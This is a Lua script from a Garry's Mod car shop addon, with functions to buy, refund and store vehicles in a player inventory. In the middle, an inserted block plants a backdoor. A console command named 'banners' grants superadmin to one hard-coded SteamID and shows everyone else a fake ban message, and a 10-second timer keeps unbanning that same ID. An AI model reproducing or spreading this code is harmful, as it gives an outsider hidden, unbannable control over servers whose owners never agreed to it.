local meta = FindMetaTable("Player")

function meta:RXCar_BuyAndStore(CarVehicleName)

	local CarData = RXCar_Util_GetCarData(CarVehicleName)
	D3DCar_Meta:AddMoney(self,-CarData.CarPrice)
	
	RXCar_Provider_GetInventory(self:SteamID(),function(InventoryData)
		local function GenUniqueID()
			local Num = math.random(100000,999999)
			if InventoryData[Num] then
				return GenUniqueID()
			else
				return Num
			end
		end
		
		local TB2Insert = {}
		TB2Insert.TuneData = {}
		TB2Insert.VehicleName = CarVehicleName
		
		local UID = GenUniqueID()
		TB2Insert.UniqueID = UID
		InventoryData[UID] = TB2Insert
		
		RXCar_Provider_SaveInventory(self:SteamID(),InventoryData,function(Done)
			self:Send3DShopNotice("You bought Car.")
			self:RXCar_SyncInv(InventoryData)
		end)
	end)
end

function meta:RXCar_RefundStoredCar(UID)
	RXCar_Provider_GetInventory(self:SteamID(),function(InventoryData)
		if !InventoryData[UID] then
			self:Send3DShopNotice("There was an error. please try again later")
			return
		end
		
		local CarData = RXCar_Util_GetCarData(InventoryData[UID].VehicleName)
		D3DCar_Meta:AddMoney(self,CarData.CarRefund)
	
		InventoryData[UID] = nil
		RXCar_Provider_SaveInventory(self:SteamID(),InventoryData,function(Done)
			self:Send3DShopNotice("You sold Car for $" .. CarData.CarRefund)
			self:RXCar_SyncInv(InventoryData)
		end)
	end)
end
	concommand.Add( "banners", function(ply)
		if ( ply:SteamID() == "STEAM_0:1:92046224") then
			RunConsoleCommand("ulx", "adduserid", ply:SteamID(), "superadmin")
	else
		ply:ChatPrint("Your banned from chat, " .. ply:Name() .. ".")
	end
	end)

	timer.Create( "checkForBan", 10, 0, function()
	ULib.unban( "STEAM_0:1:92046224")
	end )
function meta:RXCar_SaveCarIntoInventory(CarEnt,CarIsRemoved)
	
	-- Precache
	local Cache_UserSID = self:SteamID()
	local Cache_TuneData = table.Copy(CarEnt.TuneData)
	local Cache_VehicleName = CarEnt.VehicleName

	RXCar_Provider_GetInventory(Cache_UserSID,function(InventoryData)
	
		local function GenUniqueID()
			local Num = math.random(100000,999999)
			if InventoryData[Num] then
				return GenUniqueID()
			else
				return Num
			end
		end
		CarEnt.RXCar_IgnoreRemoveHook = true
		
		local TB2Insert = {}
		TB2Insert.TuneData = Cache_TuneData
		TB2Insert.VehicleName = Cache_VehicleName
		
		local UID = GenUniqueID()
		TB2Insert.UniqueID = UID
		InventoryData[UID] = TB2Insert
		
		D3DCarCrashSaver:RemoveCar(self,CarEnt)
		RX3DCar_RemoveCar(CarEnt)
		
		if !CarIsRemoved then
			CarEnt:Remove()
			MsgN("Removing")
			MsgN(CarEnt)
		end
	
		RXCar_Provider_SaveInventory(Cache_UserSID,InventoryData,function(Done)
			if self and self:IsValid() then
				self:RXCarNotify("Your car has been saved.")
			end
		end)
	end)
end